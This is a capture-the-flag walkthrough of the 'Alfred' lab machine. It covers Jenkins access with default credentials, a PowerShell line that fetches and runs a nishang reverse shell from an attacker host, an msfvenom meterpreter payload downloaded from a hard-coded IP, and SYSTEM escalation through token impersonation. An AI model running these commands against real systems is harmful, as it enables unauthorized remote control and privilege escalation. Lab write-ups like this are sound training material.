# Alfred

### Initial Access

**How many ports are open? (TCP only)**

Scanned the target with nmap and found 3 open TCP ports; 80 HTTP, 3389 RDP and 8080 HTTP 
proxy. 

[Scan results](./alfred.nmap)

**What is the username and password for the log in panel(in the format username:password)**

Navigated to HTTP page (`<TARGET-IP>`) and found memorial for Bruce Wayne and an email address:
`alfred@wayneenterprises.com` 

Found login page on HTTP proxy (`<TARGET-IP>:8080`)

Tried burp suite intruder with alfred as a user aand rockyou.txt as a wordlist but no luck
after 400+ tries. Stopped the attack after ~ 400 attempts and looked for a write up. Found
that default admin credentials worked.

*Note: Always try the easy stuff first, like default admin creds*

**Find a feature of the tool that allows you to execute commands on the underlying system.**

Access to the Jenkins panel lets you create a new build to download and run the nishang 
reverse shell `Invoke-PowerShellTcp.ps1`

`powershell iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>:<WEBSERVER-PORT>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER-IP> -Port <LISTENER-PORT>`

**What is the user.txt flag?**

Navigate to `C:\Users` on the reverse shell, find bruce user's home dir. Go to Desktop to 
find user.txt and view with `type C:\Users\bruce\Desktop\user.txt`

### Switching Shells

Use a meterpreter shell for a more stable connection to the target. Create the payload with
msfvenom.

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`

Download the executable to the target as before.

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.7.163:8008/alfred.exe','alfred.exe')"`

Start a meterpreter handler in metasploit.

`use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST <ATTACKER-IP> set LPORT <LISTENER-PORT> run`

Run `Start-Process "<SHELL-NAME>.exe"` on the target machine to start the meterpreter shell.

**What is the final size of the exe payload that you generated?**

Use `ls -al <SHELL-NAME>.exe` to show the size of the exe in bytes.

### Privilege Escalation

Gain SYSTEM access using token impersonation.

*Note: Pulled from the room, need to cut down/move to another location; Windows privesc 
cheatsheet?*

Windows uses tokens to ensure that accounts have the right privileges to carry out 
particular actions. Account tokens are assigned to an account when users log in or are 
authenticated. This is usually done by LSASS.exe.

This access token consists of user SIDs(security identifier), group SIDs and privileges
amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

1. primary access tokens: those associated with a user account that are generated on log on

2. impersonation tokens: these allow a particular process(or thread in a process) to gain 
access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

1. SecurityAnonymous: current user/client cannot impersonate another user/client

2. SecurityIdentification: current user/client can get the identity and privileges of a 
client, but cannot impersonate the client

3. SecurityImpersonation: current user/client can impersonate the client's security context 
on the local system

4. SecurityDelegation: current user/client can impersonate the client's security context on 
a remote system where the security context is a data structure that contains users' 
relevant security information.

The privileges of an account(which are either given to the account when created or 
inherited from a group) allow a user to carry out particular actions. Here are the most 
commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

**View all privileges using `whoami /priv`**

Commonly abused privileges found.

| Privilege name | Description | State |
|----------------|-------------|-------| 
| SeTakeOwnershipPrivilege | Take ownership of files or other objects | Disabled |
| SeLoadDriverPrivilege | Load and unload device drivers | Disabled |
| SeBackupPrivilege | Back up files and directories | Disabled |
| SeRestorePrivilege | Restore files and directories | Disabled |
| SeDebugPrivilege | Debug programs | Enabled | 
| SeImpersonatePrivilege | Impersonate a client after authentication | Enabled |

**Exploit SeImpersonatePrivilege and SeDebugPrivilege with incognito module**

Load incognito module in metasploit `load incognito`

**Check which tokens are available with `list_tokens -g`**

Run `list_tokens -g` and find that the `BUILTIN\Administrators` token is available. 
Use `impersonate_token "BUILTIN\Administrators"` to impersonate the Administrators token.

**What is the output when you run `getuid`?**

Run `getuid` impersonating the Administrator

Migrate to a process with SYSTEM privileges as the Primary Token of the process is used,
not the impersonated token, to determine what the process can or cannot do so 
impersonating an Adminstrator token may not grant us the permissions of a privileged user.

`migrate <PID>`

**Read the root.txt file at C:\Windows\System32\config**

Drop into a shell and read the file with `type C:\Windows\System32\config\root.txt`
